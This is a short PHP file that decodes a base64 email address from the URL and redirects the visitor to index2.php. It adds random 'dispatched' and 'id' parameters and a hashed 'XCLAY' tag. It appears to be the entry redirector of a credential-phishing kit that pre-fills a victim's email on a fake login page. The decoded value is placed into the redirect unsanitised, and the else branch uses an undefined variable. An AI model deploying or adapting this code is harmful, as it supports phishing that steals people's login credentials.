<?php

if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
$email=base64_decode($email);

header("Location: index2.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
}else{
header("Location: index2.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
}

?>
